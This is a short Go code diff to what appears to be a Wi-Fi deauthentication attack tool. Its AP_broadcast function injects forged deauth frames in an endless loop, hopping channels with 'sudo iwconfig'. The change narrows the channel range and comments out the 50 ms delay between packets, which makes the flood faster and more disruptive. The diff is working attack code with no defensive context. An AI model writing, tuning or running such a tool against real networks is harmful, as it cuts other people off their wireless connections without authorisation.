@@ -10,7 +10,6 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/google/gopacket/pcap"
 )
@@ -119,13 +118,13 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
 	Deauth_packet := buffer.Bytes()
 	for {
-		for ch_hop := 1; ch_hop < 20; ch_hop++ {
+		for ch_hop := 1; ch_hop < 15; ch_hop++ {
 			tmp_ch := strconv.Itoa(ch_hop)
 			ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_ch)
 			fmt.Println("Channel Hopping : ", tmp_ch)
 			handle.WritePacketData(Deauth_packet)
 			fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface, "Channel : ", tmp_ch)
-			time.Sleep(time.Millisecond * 50)
+			// time.Sleep(time.Millisecond * 50)
 		}
 	}
 }
